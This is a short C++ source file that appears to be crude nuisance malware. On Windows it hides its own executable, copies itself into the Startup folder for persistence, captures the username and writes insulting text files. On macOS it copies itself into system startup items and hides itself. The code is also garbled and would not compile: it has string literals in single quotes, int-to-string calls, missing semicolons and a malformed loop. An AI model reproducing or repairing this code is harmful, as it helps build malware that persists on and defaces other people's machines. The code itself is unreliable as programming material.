#include <iostream>
#include <fstream>
#include <cstdlib>
#include <string>

using namespace std;

char msg[] = "Karma is a cunt sometimes... This time it was even more of a cunt";

int isWindows = 0;
int isApple   = 0;

string line = "";
string file = "";

int main(int argc, char const *argv[]) {

  #ifdef _WIN32
    isWindows = 1;
  #endif

  #ifdef __APPLE__
    isApple = 1;
  #endif

  if (isWindows == 1) {
    system(("attrib +h " + argv[0]).c_str());
    system(("copy " + argv[0] + " C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp").c_str());
    system(("attrib +h C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp" + argv[0]).c_str());
    system("echo %USERNAME% > output.txt");

    ofstream username ('output.txt');

    if (username.is_open()) {
      while (getline(username, line)) {
        file = file + line;
      }
      username.close();
    } else {
      system(("del " + argv[0]).c_str());
    }

    for (int i = 0; i <= 69; i++) {
      ifstream newFile (('hahahahahha' + i.c_str() + ".txt").c_str())

      if (newFile.is_open()) {
        newFile << "You is idiot - Fuk off m8" << endl;
        newFile.close();
      }
    }

    system("del output.txt");
  }

  if (isApple == 1) {
    system(("cp " + argv[0] + " /System/Library/StartupItems").c_str());
    system(("chflags hidden " + argv[0]).c_str());
    system(("chflags hidden /System/Library/StartupItems/" + argv[0]).c_str());
    for (int x, x <= 69, i++) {
      ifstream newFile (('hahahahahahhahha' + i.c_str() + ".txt").c_str())

      if (newFile.is_open()) {
        newFile << "You is idiot - Fuk off m8" << endl;
        newFile.close();
      }
    }
  }

  return 0;
}
